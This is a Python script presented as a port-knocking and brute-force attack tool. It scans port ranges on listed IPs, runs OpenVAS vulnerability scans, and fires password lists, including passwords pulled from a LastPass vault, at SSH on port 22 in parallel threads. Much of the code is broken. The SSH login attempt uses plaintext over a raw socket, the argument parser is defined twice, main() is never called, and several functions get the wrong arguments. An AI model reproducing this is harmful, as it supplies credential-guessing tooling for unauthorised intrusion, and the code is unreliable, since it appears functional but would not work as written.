import argparse
import concurrent.futures
import ipaddress
import itertools
import matplotlib.pyplot as plt
import socket
import sys
import lastpass
from gvm.connections import UnixSocketConnection
from gvm.protocols.latest import Gmp
from gvm.transforms import EtreeTransform
from gvm.xml import pretty_print

def validate_ip(ip):
    """Validate if the given IP address is a valid IPv4 or IPv6 address.
    
    Args:
    ip (str): The IP address to validate.

    Returns:
    bool: True if the IP address is valid, False otherwise.
    """
    try:
        # Check if IP address is valid IPv4 or IPv6 address
        ipaddress.ip_address(ip)
        return True
    except:
        return False

def validate_port(port):
    """Validate if the given port is a valid integer between 1 and 65535.

    Args:
    port (str): The port number to validate.

    Returns:
    bool: True if the port number is valid, False otherwise.
    """
    # Return True if the port is a valid integer between 1 and 65535, otherwise False.
    return port.isnumeric() and 1 <= int(port) <= 65535


def validate_port_range(port_range):
    """Validate if the given port range is valid (e.g. 1-100).

    Args:
    port_range (str): The port range to validate.

    Returns:
    bool: True if the port range is valid, False otherwise.
    """
    # Check if port_range is valid (e.g. 1-100)
    if "-" not in port_range:
        return False
    start_port, end_port = map(str.strip, port_range.split("-"))
    return validate_port(start_port) and validate_port(end_port)


def validate_args(args):
    """Validate if the provided IP address and port range are valid.

    Args:
    args (argparse.Namespace): The parsed command-line arguments.

    Returns:
    bool: True if the IP address and port range are valid, False otherwise.
    """
    # Check if the provided IP address and port range are valid.
    return all(validate_ip(ip) 
    for ip in args.ip_list) and validate_port_range(args.port_range)


def validate_ip_list(ip_list):
    """Validate if all IP addresses in the given list are valid IPv4 or IPv6 addresses.

    Args:
    ip_list (list): The list of IP addresses to validate.

    Returns:
    bool: True if all IP addresses are valid, False otherwise.
    """
    # Return True if all IP addresses in the list are valid IPv4 or IPv6 addresses, otherwise False.
    return all(validate_ip(ip) for ip in ip_list)

def scan_vulnerabilities(ip):
    """Scan the given IP address for vulnerabilities using OpenVAS.

    Args:
    ip (str): The IP address to scan.

    Returns:
    list: A list of vulnerabilities found on the scanned IP address.
    """
    # Scan the given IP address for vulnerabilities using OpenVAS.
    conn = UnixSocketConnection()
    conn.connect()
    transform = EtreeTransform()
    gmp = Gmp(connection=conn, transform=transform)

    gmp.authenticate('username', 'password')
    gmp.start_session()

    report_id = gmp.create_report(
        f"Scan of {ip}",
        f"Target: {ip}",
        f"<get_reports report_id='last'/>",
        report_format_id='c402cc3e-b531-11e1-9163-406186ea4fc5',
        preference=[('report_host_details', 'detailed_high'), ('severity', '6')]
    )

    report_xml = gmp.get_report(report_id)
    report = transform.parse(report_xml)

    vulns = []
    for result in report.xpath('//results/result'):
        vuln = {}
        vuln['name'] = result.xpath('name')[0].text
        vuln['severity'] = int(result.xpath('severity')[0].text)
        vuln['description'] = result.xpath('description')[0].text
        vuln['solution'] = result.xpath('solution')[0].text
        vuln['cvss_base'] = float(result.xpath('cvss_base')[0].text)
        vulns.append(vuln)

    return vulns


def scan_port(ip, port, knock_sequence, protocol=None):
    """Scan the specified port on the given IP address using TCP, optionally using the given protocol.

    Args:
        ip (str): The IP address to scan.
        port (int): The port number to scan.
        knock_sequence (list): A sequence of ports to knock on before scanning the target port.
        protocol (str, optional): The protocol to use for the port scan. Defaults to None.

    Returns:
        int or False: If the port is open, returns the port number. Otherwise, returns False.
    """
    if protocol is not None:
        try:
            # Map the port number to the corresponding protocol name
            protocol_name = socket.getservbyport(port, protocol)
            if protocol_name.lower() != protocol.lower():
                return False
        except:
            return False

    if scan_udp_port(ip, port):
        print(f"UDP port {port} is open.")
        return port

    with socket.socket(socket.AF_INET6 if ":" in ip else socket.AF_INET, 
                       socket.SOCK_STREAM) as sock:
        sock.settimeout(0.5)

        for knock_port in knock_sequence:
            try:
                sock.connect((ip, knock_port))
            except:
                return False

        try:
            sock.connect((ip, port))
            banner = sock.recv(1024).decode().strip()
            print(f"Port {port} is open. Banner information: {banner}")
            return port
        except:
            pass

    return False


def scan_udp_port(ip, port):
    """Scan the specified port on the given IP address using UDP.

    Args:
        ip (str): The IP address to scan.
        port (int): The port number to scan.

    Returns:
        bool: True if the port is open, False otherwise.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(0.5)
        try:
            sock.sendto(b"test", (ip, port))
            data, addr = sock.recvfrom(1024)
            return True
        except:
            return False


def scan_ports(ip, start_port, end_port, knock_sequence):
    """Scan a range of ports on the given IP address using TCP, using either the HTTP or FTP protocol.

    Args:
        ip (str): The IP address to scan.
        start_port (int): The first port in the range to scan.
        end_port (int): The last port in the range to scan.
        knock_sequence (list): A sequence of ports to knock on before scanning each port in the range.

    Returns:
        list: A list of open port numbers.
    """
    open_ports = []
    for port in range(start_port, end_port + 1):
        if scan_port(ip, port, knock_sequence, protocol="http") \
            or scan_port(ip, port, knock_sequence, protocol="ftp"):
            open_ports.append(port)
    return open_ports


def brute_force_password(ip, password):
    """Attempt to authenticate with the given password for the SSH service on the given IP address.

    Args:
        ip (str): The IP address to attempt to authenticate with.
        password (str): The password to use for authentication.

    Returns:
        bool: True if authentication is successful, False otherwise.
    """
    # Try to authenticate with the given password for the SSH service on the given IP address.
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0.5)
        try:
            sock.connect((ip, 22))
            sock.recv(1024)  # Receive banner information
            sock.sendall(b"username\n")
            sock.recv(1024)  # Receive prompt for password
            sock.sendall(password.encode() + b"\n")
            response = sock.recv(1024).decode().strip()  # Receive response
            if "Authentication failed" not in response:
                print(f"Authentication successful with password: {password}")
                return True
        except:
            pass
    return False

def brute_force_passwords(ip, passwords):
    """Attempt to authenticate with each password in the given list for the SSH service on the given IP address.

    Args:
        ip (str): The IP address to attempt to authenticate with.
        passwords (list): A list of passwords to use for authentication.

    Returns:
        bool: True if authentication is successful with any password in the list, False otherwise.
    """
    # Try to authenticate with each password in the given list for the SSH service on the given IP address.
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(
        brute_force_password, ip, password) for password in passwords]
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                return True
    print("Brute-force attack unsuccessful")
    return False

def plot_histogram(data, title):
    """Create a histogram of the given data.

    Args:
        data (list): A list of numbers to create a histogram for.
        title (str): The title to use for the histogram.
    """
    if len(data) == 0:
        print("No open ports found.")
        return

    bins = max(len(data), 1)
    plt.hist(data, bins=bins)
    plt.title(title)
    plt.xlabel("Port number")
    plt.ylabel("Frequency")
    plt.show()
    

def load_password_list(password_manager, filename=None):
    """Load a list of passwords from the given password manager or file.

    Args:
        password_manager (str): The password manager to load the passwords from.
        filename (str, optional): The name of the file to load passwords from, if using the "file" password manager. Defaults to None.

    Returns:
        list: A list of passwords.
    """
    # Load the list of passwords from the given password manager or file
    if password_manager == "lastpass":
        try:
            vault = lastpass.Vault.open_remote(
                username="my_username",
                password="my_password",
                multifactor_password="my_mfa_password"
            )
            accounts = vault.accounts
            passwords = [account.password for account in accounts]
            if not passwords:
                print("No passwords found in LastPass.")
            return passwords
        except Exception as e:
            print(f"Error loading passwords from LastPass: {e}")
            return []
    elif password_manager == "file":
        if filename is None:
            print("Filename not provided.")
            return []
        try:
            with open(filename, "r") as f:
                passwords = f.read().splitlines()
                if not passwords:
                    print("No passwords found in file.")
                return passwords
        except Exception as e:
            print(f"Error loading passwords from file: {e}")
            return []
    else:
        print("Invalid password manager.")
        return []

def main():
    parser = argparse.ArgumentParser(description='Scan ports and vulnerabilities on a list of IP addresses.')
    parser.add_argument('ip_list', metavar='IP', type=str, nargs='+',
                        help='a list of IP addresses to scan')
    parser.add_argument('-p', '--port_range', metavar='PORT_RANGE', type=str,
                        default='1-1024',
                        help='the port range to scan, in the format START_PORT-END_PORT. Default is 1-1024.')
    parser.add_argument('-v', '--vuln_scan', action='store_true',
                        help='enable vulnerability scanning using OpenVAS. Requires authentication credentials.')
    parser.add_argument('-s', '--ssl', action='store_true',
                        help='use SSL for OpenVAS connection.')
    parser.add_argument('-u', '--udp', action='store_true',
                        help='scan UDP ports in addition to TCP ports.')
    parser.add_argument('-t', '--knock_sequence', metavar='KNOCK_SEQUENCE', type=str,
                        default='',
                        help='the sequence of ports to knock on before scanning the target port, in the format PORT1,PORT2,.... Default is no knock sequence.')
    args = parser.parse_args()

    if not validate_args(args):
        print('Invalid IP address or port range.')
        return

    knock_sequence = []
    if args.knock_sequence:
        knock_sequence = list(map(int, args.knock_sequence.split(',')))

    with concurrent.futures.ThreadPoolExecutor() as executor:
        # Scan ports for each IP address concurrently using a thread pool executor.
        futures = []
        for ip in args.ip_list:
            futures.append(executor.submit(scan_ports, ip, *map(int, args.port_range.split('-')), knock_sequence, args.udp))

        for future, ip in zip(futures, args.ip_list):
            open_ports = future.result()
            if open_ports:
                print(f"Open ports for {ip}: {open_ports}")
            else:
                print(f"No open ports found on {ip}.")

        # Scan vulnerabilities for each IP address concurrently using a separate thread pool executor.
        if args.vuln_scan:
            futures = []
            with UnixSocketConnection() as conn:
                conn.connect()
                gmp = Gmp(connection=conn, transform=EtreeTransform())
                gmp.authenticate('username', 'password')
                gmp.start_session()

                for ip in args.ip_list:
                    futures.append(executor.submit(scan_vulnerabilities, ip, gmp, args.ssl))

                for future, ip in zip(futures, args.ip_list):
                    vulns = future.result()
                    if vulns:
                        print(f"Vulnerabilities for {ip}:")
                        for vuln in vulns:
                            print(vuln['name'], vuln['severity'], vuln['description'])
                    else:
                        print(f"No vulnerabilities found on {ip}.")

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="Port knocking and brute-force password attack tool")
    parser.add_argument("ip_list", type=str, 
                        nargs="+", help="List...")
    parser.add_argument("--password-manager", type=str, 
                        choices=["lastpass", ""], 
                        help="Password manager to use")

    args = parser.parse_args()

    if args.password_manager == "lastpass":
        if lastpass is None:
            print("LastPass module not found. Please install the module using 'pip install lastpass'")
            sys.exit(1)

        passwords = load_password_list(lastpass)
    else:
        passwords = load_password_list("file", "passwords/passwords_list.csv")


    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description="Port knocking and brute-force password attack tool")
    parser.add_argument("ip_list", type=str, 
                        nargs="+", help="List of IP addresses to scan")
    parser.add_argument("port_range", type=str,
                        help="Range of ports to scan (e.g. 1-100)")
    parser.add_argument("-k", "--knock_sequence", 
                        type=str, default="",
                        help="Knock sequence for port knocking (e.g. '1,2,3')")
    parser.add_argument("-p", "--password_list", 
                        type=str, default="passwords/passwords_list.csv",
                        help="List of passwords for brute-force password attack")
    args = parser.parse_args()

    # Validate command line arguments
    if not validate_ip_list(args.ip_list):
        print("Invalid IP address in the list")
        sys.exit(1)
    if not validate_port_range(args.port_range):
        print("Invalid port range")
        sys.exit(1)

    # Parse port range
    start_port, end_port = map(str.strip, args.port_range.split("-"))
    start_port = int(start_port)
    end_port = int(end_port)

    # Parse knock sequence
    knock_sequence = []
    if args.knock_sequence:
        try:
            knock_sequence = list(map(int, args.knock_sequence.split(",")))
        except:
            print("Invalid knock sequence")
            sys.exit(1)

    # Load password list
    passwords = load_password_list(args.password_list)

    # Scan ports and brute-force passwords for each IP address
    for ip in args.ip_list:
        print(f"Scanning ports for {ip}...")
        open_ports = scan_ports(ip, start_port, end_port, knock_sequence)
        plot_histogram(open_ports, f"Histogram of open ports for {ip}")
        if len(passwords) > 0:
            print(f"Brute-forcing passwords for {ip}...")
            brute_force_passwords(ip, passwords)








